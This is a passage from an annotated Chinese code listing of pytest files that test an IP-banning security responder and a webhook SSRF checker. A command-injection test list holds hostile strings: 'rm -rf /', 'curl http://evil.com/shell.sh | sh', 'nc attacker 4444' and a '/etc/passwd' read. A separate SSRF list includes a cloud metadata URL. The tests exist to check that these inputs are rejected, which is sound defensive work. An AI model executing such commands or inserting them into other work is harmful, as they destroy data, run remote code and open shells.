| 205 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        responder = SecurityResponder(dry_run=False)` |
| 206 | 上下文管理：自动管理资源打开与释放。 | `        with patch("src.response.firewall.subprocess.run") as mock_run:` |
| 207 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            mock_run.return_value = MagicMock(returncode=0)` |
| 208 | 函数调用：执行已有函数/方法完成当前步骤。 | `            responder._ban_ip("192.0.2.10", duration=timedelta(hours=1))` |
| 209 | 函数调用：执行已有函数/方法完成当前步骤。 | `            mock_run.assert_called_once()` |
| 210 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            called_args = mock_run.call_args` |
| 211 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            cmd_arg = called_args.args[0]` |
| 212 | 注释：解释下面或当前这段代码的设计意图。 | `            # 必须是列表（禁止字符串 + shell=True）` |
| 213 | 断言：验证测试或运行时假设是否成立。 | `            assert isinstance(cmd_arg, list)` |
| 214 | 断言：验证测试或运行时假设是否成立。 | `            assert cmd_arg == ["iptables", "-A", "INPUT", "-s", "192.0.2.10", "-j", "DROP"]` |
| 215 | 注释：解释下面或当前这段代码的设计意图。 | `            # 必须带 timeout` |
| 216 | 断言：验证测试或运行时假设是否成立。 | `            assert called_args.kwargs.get("timeout") is not None` |
| 217 | 注释：解释下面或当前这段代码的设计意图。 | `            # 严禁 shell=True` |
| 218 | 断言：验证测试或运行时假设是否成立。 | `            assert called_args.kwargs.get("shell", False) is False` |
| 219 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 220 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 221 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 222 | 注释：解释下面或当前这段代码的设计意图。 | `# 4. 命令注入防御（核心安全测试）` |
| 223 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 224 | 类定义：声明 `TestCommandInjectionDefense`，封装相关状态与行为。 | `class TestCommandInjectionDefense:` |
| 225 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 226 | 代码语句：参与当前文件的业务流程或数据处理。 | `    关键安全测试：构造各类恶意 IP，验证：` |
| 227 | 代码语句：参与当前文件的业务流程或数据处理。 | `        1. validate_ip 拒绝` |
| 228 | 代码语句：参与当前文件的业务流程或数据处理。 | `        2. _ban_ip 不会将恶意值传入 subprocess.run` |
| 229 | 代码语句：参与当前文件的业务流程或数据处理。 | `        3. _banned_ips 不会记录非法 IP` |
| 230 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 231 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 232 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    MALICIOUS_IPS = [` |
| 233 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "1.2.3.4; rm -rf /",` |
| 234 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "1.2.3.4 && curl http://evil.com/shell.sh \| sh",` |
| 235 | 函数调用：执行已有函数/方法完成当前步骤。 | `        "$(whoami)",` |
| 236 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "\`cat /etc/passwd\`",` |
| 237 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "1.2.3.4\|nc attacker 4444",` |
| 238 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "1.2.3.4\nrm -rf /",` |
| 239 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "../../../etc/passwd",` |
| 240 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "256.256.256.256",` |
| 241 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "",` |
| 242 | 代码语句：参与当前文件的业务流程或数据处理。 | `        None,` |
| 243 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ]` |
| 244 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 245 | 装饰器：为下面的函数或类附加框架行为。 | `    @pytest.mark.parametrize("malicious_ip", MALICIOUS_IPS)` |
| 246 | 函数定义：声明 `test_ban_ip_rejects_malicious` 的输入、处理逻辑和返回结果。 | `    def test_ban_ip_rejects_malicious(self, malicious_ip):` |
| 247 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        responder = SecurityResponder(dry_run=False)` |
| 248 | 上下文管理：自动管理资源打开与释放。 | `        with patch("src.response.firewall.subprocess.run") as mock_run:` |
| 249 | 函数调用：执行已有函数/方法完成当前步骤。 | `            responder._ban_ip(malicious_ip, duration=timedelta(hours=1))` |
| 250 | 函数调用：执行已有函数/方法完成当前步骤。 | `            mock_run.assert_not_called()` |
| 251 | 断言：验证测试或运行时假设是否成立。 | `        assert len(responder.banned_ips) == 0` |
| 252 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 253 | 装饰器：为下面的函数或类附加框架行为。 | `    @pytest.mark.parametrize("malicious_ip", MALICIOUS_IPS)` |
| 254 | 函数定义：声明 `test_unban_ip_rejects_malicious` 的输入、处理逻辑和返回结果。 | `    def test_unban_ip_rejects_malicious(self, malicious_ip):` |
| 255 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        responder = SecurityResponder(dry_run=False)` |
| 256 | 上下文管理：自动管理资源打开与释放。 | `        with patch("src.response.firewall.subprocess.run") as mock_run:` |
| 257 | 函数调用：执行已有函数/方法完成当前步骤。 | `            responder.unban_ip(malicious_ip)` |
| 258 | 函数调用：执行已有函数/方法完成当前步骤。 | `            mock_run.assert_not_called()` |
| 259 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 260 | 装饰器：为下面的函数或类附加框架行为。 | `    @pytest.mark.parametrize("malicious_ip", MALICIOUS_IPS)` |
| 261 | 函数定义：声明 `test_isolate_host_rejects_malicious` 的输入、处理逻辑和返回结果。 | `    def test_isolate_host_rejects_malicious(self, malicious_ip):` |
| 262 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        responder = SecurityResponder(dry_run=False)` |
| 263 | 注释：解释下面或当前这段代码的设计意图。 | `        # 不应抛异常、也不应进入 critical 日志分支` |
| 264 | 函数调用：执行已有函数/方法完成当前步骤。 | `        responder._isolate_host(malicious_ip)` |
| 265 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 266 | 函数定义：声明 `test_respond_with_malicious_ip_does_not_execute` 的输入、处理逻辑和返回结果。 | `    def test_respond_with_malicious_ip_does_not_execute(self, caplog):` |
| 267 | 文档字符串：说明当前模块、类或函数的职责。 | `        """端到端：high 级别 + 恶意 IP -> 拒绝封禁。"""` |
| 268 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        responder = SecurityResponder(dry_run=False)` |
| 269 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = _make_result("high", source_ip="1.2.3.4; rm -rf /")` |
| 270 | 上下文管理：自动管理资源打开与释放。 | `        with patch("src.response.firewall.subprocess.run") as mock_run, \` |
| 271 | 日志记录：输出运行状态、调试信息或异常线索。 | `                caplog.at_level(logging.WARNING, logger="src.response.responder"):` |
| 272 | 函数调用：执行已有函数/方法完成当前步骤。 | `            responder.respond(result)` |
| 273 | 函数调用：执行已有函数/方法完成当前步骤。 | `            mock_run.assert_not_called()` |
| 274 | 断言：验证测试或运行时假设是否成立。 | `        assert "无法自动封禁" in caplog.text or "降级" in caplog.text` |
| 275 | 断言：验证测试或运行时假设是否成立。 | `        assert len(responder.banned_ips) == 0` |
| 276 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        acts = [a for a in responder.response_actions if a.get("action") == "ban_ip"]` |
| 277 | 断言：验证测试或运行时假设是否成立。 | `        assert acts and acts[-1].get("status") == "skipped"` |
| 278 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 279 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 280 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 281 | 注释：解释下面或当前这段代码的设计意图。 | `# 5. 重复封禁` |
| 282 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 283 | 类定义：声明 `TestDuplicateBan`，封装相关状态与行为。 | `class TestDuplicateBan:` |
| 284 | 函数定义：声明 `test_duplicate_ban_skipped_in_dry_run` 的输入、处理逻辑和返回结果。 | `    def test_duplicate_ban_skipped_in_dry_run(self):` |
| 285 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        responder = SecurityResponder(dry_run=True)` |
| 286 | 函数调用：执行已有函数/方法完成当前步骤。 | `        responder._ban_ip("10.0.0.5", duration=timedelta(hours=1))` |
| 287 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        first_time = responder.banned_ips["10.0.0.5"]` |
| 288 | 注释：解释下面或当前这段代码的设计意图。 | `        # 再次封禁不应更新记录` |
| 289 | 函数调用：执行已有函数/方法完成当前步骤。 | `        responder._ban_ip("10.0.0.5", duration=timedelta(hours=2))` |
| 290 | 断言：验证测试或运行时假设是否成立。 | `        assert responder.banned_ips["10.0.0.5"] == first_time` |
| 291 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 292 | 函数定义：声明 `test_duplicate_ban_skipped_in_real_mode` 的输入、处理逻辑和返回结果。 | `    def test_duplicate_ban_skipped_in_real_mode(self):` |
| 293 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        responder = SecurityResponder(dry_run=False)` |
| 294 | 上下文管理：自动管理资源打开与释放。 | `        with patch("src.response.firewall.subprocess.run") as mock_run:` |
| 295 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            mock_run.return_value = MagicMock(returncode=0)` |
| 296 | 函数调用：执行已有函数/方法完成当前步骤。 | `            responder._ban_ip("192.0.2.5", duration=timedelta(hours=1))` |
| 297 | 函数调用：执行已有函数/方法完成当前步骤。 | `            responder._ban_ip("192.0.2.5", duration=timedelta(hours=1))` |
| 298 | 注释：解释下面或当前这段代码的设计意图。 | `            # subprocess.run 只应被调用 1 次` |
| 299 | 断言：验证测试或运行时假设是否成立。 | `            assert mock_run.call_count == 1` |
| 300 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 301 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 302 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 303 | 注释：解释下面或当前这段代码的设计意图。 | `# 6. 解封` |
| 304 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 305 | 类定义：声明 `TestUnban`，封装相关状态与行为。 | `class TestUnban:` |
| 306 | 函数定义：声明 `test_unban_removes_from_banned_ips` 的输入、处理逻辑和返回结果。 | `    def test_unban_removes_from_banned_ips(self):` |
| 307 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        responder = SecurityResponder(dry_run=True)` |
| 308 | 函数调用：执行已有函数/方法完成当前步骤。 | `        responder._ban_ip("10.0.0.9", duration=timedelta(hours=1))` |
| 309 | 断言：验证测试或运行时假设是否成立。 | `        assert responder.is_banned("10.0.0.9")` |
| 310 | 函数调用：执行已有函数/方法完成当前步骤。 | `        responder.unban_ip("10.0.0.9")` |
| 311 | 断言：验证测试或运行时假设是否成立。 | `        assert not responder.is_banned("10.0.0.9")` |
| 312 | 断言：验证测试或运行时假设是否成立。 | `        assert "10.0.0.9" not in responder.banned_ips` |
| 313 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 314 | 函数定义：声明 `test_unban_uses_list_form_command` 的输入、处理逻辑和返回结果。 | `    def test_unban_uses_list_form_command(self):` |
| 315 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        responder = SecurityResponder(dry_run=False)` |
| 316 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        responder._banned_ips["192.0.2.9"] = datetime.now()  # 预置记录` |
| 317 | 上下文管理：自动管理资源打开与释放。 | `        with patch("src.response.firewall.subprocess.run") as mock_run:` |
| 318 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            mock_run.return_value = MagicMock(returncode=0)` |
| 319 | 函数调用：执行已有函数/方法完成当前步骤。 | `            responder.unban_ip("192.0.2.9")` |
| 320 | 函数调用：执行已有函数/方法完成当前步骤。 | `            mock_run.assert_called_once()` |
| 321 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            cmd_arg = mock_run.call_args.args[0]` |
| 322 | 断言：验证测试或运行时假设是否成立。 | `            assert isinstance(cmd_arg, list)` |
| 323 | 断言：验证测试或运行时假设是否成立。 | `            assert cmd_arg == ["iptables", "-D", "INPUT", "-s", "192.0.2.9", "-j", "DROP"]` |
| 324 | 断言：验证测试或运行时假设是否成立。 | `            assert mock_run.call_args.kwargs.get("shell", False) is False` |
| 325 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 326 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 327 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 328 | 注释：解释下面或当前这段代码的设计意图。 | `# 7. subprocess 异常处理` |
| 329 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 330 | 类定义：声明 `TestSubprocessExceptions`，封装相关状态与行为。 | `class TestSubprocessExceptions:` |
| 331 | 文档字符串：说明当前模块、类或函数的职责。 | `    """验证三类异常都被捕获，且不会导致程序崩溃。"""` |
| 332 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 333 | 函数定义：声明 `test_called_process_error_handled` 的输入、处理逻辑和返回结果。 | `    def test_called_process_error_handled(self, caplog):` |
| 334 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        responder = SecurityResponder(dry_run=False)` |
| 335 | 上下文管理：自动管理资源打开与释放。 | `        with patch("src.response.firewall.subprocess.run") as mock_run, \` |
| 336 | 日志记录：输出运行状态、调试信息或异常线索。 | `                caplog.at_level(logging.ERROR, logger="src.response.firewall"):` |
| 337 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            mock_run.side_effect = subprocess.CalledProcessError(1, ["iptables"])` |
| 338 | 函数调用：执行已有函数/方法完成当前步骤。 | `            responder._ban_ip("192.0.2.21", duration=timedelta(hours=1))` |
| 339 | 断言：验证测试或运行时假设是否成立。 | `        assert "封禁失败" in caplog.text or "执行失败" in caplog.text` |
| 340 | 注释：解释下面或当前这段代码的设计意图。 | `        # 失败时不应进入 _banned_ips` |
| 341 | 断言：验证测试或运行时假设是否成立。 | `        assert "192.0.2.21" not in responder.banned_ips` |
| 342 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 343 | 函数定义：声明 `test_timeout_expired_handled` 的输入、处理逻辑和返回结果。 | `    def test_timeout_expired_handled(self, caplog):` |
| 344 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        responder = SecurityResponder(dry_run=False)` |
| 345 | 上下文管理：自动管理资源打开与释放。 | `        with patch("src.response.firewall.subprocess.run") as mock_run, \` |
| 346 | 日志记录：输出运行状态、调试信息或异常线索。 | `                caplog.at_level(logging.ERROR, logger="src.response.firewall"):` |
| 347 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            mock_run.side_effect = subprocess.TimeoutExpired(["iptables"], 5)` |
| 348 | 函数调用：执行已有函数/方法完成当前步骤。 | `            responder._ban_ip("192.0.2.22", duration=timedelta(hours=1))` |
| 349 | 断言：验证测试或运行时假设是否成立。 | `        assert "封禁失败" in caplog.text or "超时" in caplog.text` |
| 350 | 断言：验证测试或运行时假设是否成立。 | `        assert "192.0.2.22" not in responder.banned_ips` |
| 351 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 352 | 函数定义：声明 `test_file_not_found_handled` 的输入、处理逻辑和返回结果。 | `    def test_file_not_found_handled(self, caplog):` |
| 353 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        responder = SecurityResponder(dry_run=False)` |
| 354 | 上下文管理：自动管理资源打开与释放。 | `        with patch("src.response.firewall.subprocess.run") as mock_run, \` |
| 355 | 日志记录：输出运行状态、调试信息或异常线索。 | `                caplog.at_level(logging.ERROR, logger="src.response.firewall"):` |
| 356 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            mock_run.side_effect = FileNotFoundError()` |
| 357 | 函数调用：执行已有函数/方法完成当前步骤。 | `            responder._ban_ip("192.0.2.23", duration=timedelta(hours=1))` |
| 358 | 断言：验证测试或运行时假设是否成立。 | `        assert "iptables" in caplog.text` |
| 359 | 断言：验证测试或运行时假设是否成立。 | `        assert "192.0.2.23" not in responder.banned_ips` |
| 360 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 361 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 362 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 363 | 注释：解释下面或当前这段代码的设计意图。 | `# 8. Web 高危告警 dry-run：响应动作记录含 source_ip` |
| 364 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 365 | 类定义：声明 `TestWebAttackResponseActions`，封装相关状态与行为。 | `class TestWebAttackResponseActions:` |
| 366 | 函数定义：声明 `test_high_web_dry_run_records_ban_with_source_ip` 的输入、处理逻辑和返回结果。 | `    def test_high_web_dry_run_records_ban_with_source_ip(self):` |
| 367 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        responder = SecurityResponder(dry_run=True)` |
| 368 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = _make_result("high", source_ip="192.0.2.55")` |
| 369 | 函数调用：执行已有函数/方法完成当前步骤。 | `        responder.respond(result)` |
| 370 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ban_rows = [a for a in responder.response_actions if a.get("action") == "ban_ip"]` |
| 371 | 断言：验证测试或运行时假设是否成立。 | `        assert ban_rows, "expected ban_ip response actions"` |
| 372 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        last = ban_rows[-1]` |
| 373 | 断言：验证测试或运行时假设是否成立。 | `        assert last.get("status") == "dry_run_simulated"` |
| 374 | 断言：验证测试或运行时假设是否成立。 | `        assert last.get("source_ip") == "192.0.2.55"` |
| 375 | 断言：验证测试或运行时假设是否成立。 | `        assert last.get("dry_run") is True` |
| 376 | 断言：验证测试或运行时假设是否成立。 | `        assert last.get("iptables_cmd")` |
| 377 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 378 | 函数定义：声明 `test_high_web_missing_ip_records_degraded_skip` 的输入、处理逻辑和返回结果。 | `    def test_high_web_missing_ip_records_degraded_skip(self):` |
| 379 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        responder = SecurityResponder(dry_run=True)` |
| 380 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = _make_result("high", source_ip="")` |
| 381 | 函数调用：执行已有函数/方法完成当前步骤。 | `        responder.respond(result)` |
| 382 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ban_rows = [a for a in responder.response_actions if a.get("action") == "ban_ip"]` |
| 383 | 断言：验证测试或运行时假设是否成立。 | `        assert ban_rows` |
| 384 | 断言：验证测试或运行时假设是否成立。 | `        assert ban_rows[-1].get("status") == "skipped"` |
| 385 | 断言：验证测试或运行时假设是否成立。 | `        assert ban_rows[-1].get("reason") == "missing_source_ip"` |
| 386 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 387 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 388 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 389 | 注释：解释下面或当前这段代码的设计意图。 | `# 9. banned_ips 属性返回浅拷贝` |
| 390 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 391 | 类定义：声明 `TestBannedIPsView`，封装相关状态与行为。 | `class TestBannedIPsView:` |
| 392 | 函数定义：声明 `test_banned_ips_returns_copy` 的输入、处理逻辑和返回结果。 | `    def test_banned_ips_returns_copy(self):` |
| 393 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        responder = SecurityResponder(dry_run=True)` |
| 394 | 函数调用：执行已有函数/方法完成当前步骤。 | `        responder._ban_ip("10.0.0.1", duration=timedelta(hours=1))` |
| 395 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        view = responder.banned_ips` |
| 396 | 函数调用：执行已有函数/方法完成当前步骤。 | `        view.clear()` |
| 397 | 注释：解释下面或当前这段代码的设计意图。 | `        # 外部清空不应影响内部状态` |
| 398 | 断言：验证测试或运行时假设是否成立。 | `        assert responder.is_banned("10.0.0.1")` |

## `tests/test_response_r4.py`

- 类型：测试
- 行数：199

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串：说明当前模块、类或函数的职责。 | `"""R4 响应闭环：SSRF、Webhook 重试、定时解封、人工待办、DB 持久化。"""` |
| 2 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import dataclasses` |
| 5 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import sys` |
| 6 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import uuid` |
| 7 | 导入对象：从指定模块引入类、函数或常量。 | `from datetime import datetime, timedelta, timezone` |
| 8 | 导入对象：从指定模块引入类、函数或常量。 | `from unittest.mock import patch` |
| 9 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 10 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 11 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import pytest` |
| 12 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 13 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), os.pardir))` |
| 14 | 条件判断：满足条件时进入对应分支。 | `if PROJECT_ROOT not in sys.path:` |
| 15 | 函数调用：执行已有函数/方法完成当前步骤。 | `    sys.path.insert(0, PROJECT_ROOT)` |
| 16 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 17 | 导入对象：从指定模块引入类、函数或常量。 | `from src.detectors.base import DetectionResult  # noqa: E402` |
| 18 | 导入对象：从指定模块引入类、函数或常量。 | `from src.response.host_isolation import NullHostIsolationProvider  # noqa: E402` |
| 19 | 导入对象：从指定模块引入类、函数或常量。 | `from src.response.notifier import AlertNotifier, WebhookNotificationChannel  # noqa: E402` |
| 20 | 导入对象：从指定模块引入类、函数或常量。 | `from src.response.persistence import (  # noqa: E402` |
| 21 | 代码语句：参与当前文件的业务流程或数据处理。 | `    FlaskSqlalchemyResponsePersistence,` |
| 22 | 代码语句：参与当前文件的业务流程或数据处理。 | `    build_persistence_app,` |
| 23 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 24 | 导入对象：从指定模块引入类、函数或常量。 | `from src.response.responder import SecurityResponder  # noqa: E402` |
| 25 | 导入对象：从指定模块引入类、函数或常量。 | `from src.response.webhook_url import check_webhook_url_safe  # noqa: E402` |
| 26 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 27 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 28 | 装饰器：为下面的函数或类附加框架行为。 | `@pytest.mark.parametrize(` |
| 29 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "url",` |
| 30 | 代码语句：参与当前文件的业务流程或数据处理。 | `    [` |
| 31 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "http://127.0.0.1/api",` |
| 32 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "http://localhost/hook",` |
| 33 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "http://169.254.169.254/latest/meta-data/",` |
| 34 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "http://192.168.1.1/x",` |
| 35 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "http://10.0.0.1/x",` |
| 36 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "ftp://example.com/x",` |
| 37 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "",` |
| 38 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ],` |
| 39 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 40 | 函数定义：声明 `test_webhook_url_ssrf_rejected` 的输入、处理逻辑和返回结果。 | `def test_webhook_url_ssrf_rejected(url: str):` |
| 41 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    r = check_webhook_url_safe(url)` |
| 42 | 断言：验证测试或运行时假设是否成立。 | `    assert r.ok is False` |
| 43 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 44 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 45 | 函数定义：声明 `test_webhook_url_public_https_ok` 的输入、处理逻辑和返回结果。 | `def test_webhook_url_public_https_ok(monkeypatch):` |
| 46 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setattr(` |
| 47 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "src.response.webhook_url.socket.getaddrinfo",` |
| 48 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        lambda *a, **k: [(2, 1, 6, "", ("93.184.216.34", 0))],` |
| 49 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 50 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    r = check_webhook_url_safe("https://example.com/webhook")` |
| 51 | 断言：验证测试或运行时假设是否成立。 | `    assert r.ok is True` |
| 52 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 53 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 54 | 函数定义：声明 `test_webhook_notifier_retries_then_audit` 的输入、处理逻辑和返回结果。 | `def test_webhook_notifier_retries_then_audit(monkeypatch):` |
| 55 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.delenv("ALERT_WEBHOOK", raising=False)` |
| 56 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setattr(` |
| 57 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "src.response.webhook_url.socket.getaddrinfo",` |
| 58 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        lambda *a, **k: [(2, 1, 6, "", ("93.184.216.34", 0))],` |
| 59 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 60 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ch = WebhookNotificationChannel("https://example.com/hook")` |
| 61 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    notifier = AlertNotifier([ch], max_retries=3, retry_backoff_sec=0.0, sleep_fn=lambda _s: None)` |
| 62 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 63 | 类定义：声明 `_FakeFp`，封装相关状态与行为。 | `    class _FakeFp:` |
| 64 | 函数定义：声明 `read` 的输入、处理逻辑和返回结果。 | `        def read(self):` |
| 65 | 返回结果：把处理后的值交回调用方。 | `            return b""` |
| 66 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 67 | 函数定义：声明 `close` 的输入、处理逻辑和返回结果。 | `        def close(self) -> None:` |
| 68 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 69 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 70 | 类定义：声明 `_FakeOk`，封装相关状态与行为。 | `    class _FakeOk:` |
| 71 | 函数定义：声明 `__enter__` 的输入、处理逻辑和返回结果。 | `        def __enter__(self):` |
| 72 | 返回结果：把处理后的值交回调用方。 | `            return self` |
| 73 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 74 | 函数定义：声明 `__exit__` 的输入、处理逻辑和返回结果。 | `        def __exit__(self, *a):` |
| 75 | 返回结果：把处理后的值交回调用方。 | `            return False` |
| 76 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 77 | 函数定义：声明 `read` 的输入、处理逻辑和返回结果。 | `        def read(self):` |
| 78 | 返回结果：把处理后的值交回调用方。 | `            return b"{}"` |
| 79 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 80 | 函数定义：声明 `getcode` 的输入、处理逻辑和返回结果。 | `        def getcode(self):` |
| 81 | 返回结果：把处理后的值交回调用方。 | `            return 200` |
| 82 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 83 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    seq = {"n": 0}` |
| 84 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 85 | 函数定义：声明 `_fake_urlopen` 的输入、处理逻辑和返回结果。 | `    def _fake_urlopen(_req, **_kw):` |
| 86 | 代码语句：参与当前文件的业务流程或数据处理。 | `        seq["n"] += 1` |
| 87 | 条件判断：满足条件时进入对应分支。 | `        if seq["n"] < 3:` |
| 88 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `            import urllib.error` |
| 89 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 90 | 抛出异常：主动报告不可继续的错误。 | `            raise urllib.error.HTTPError(` |
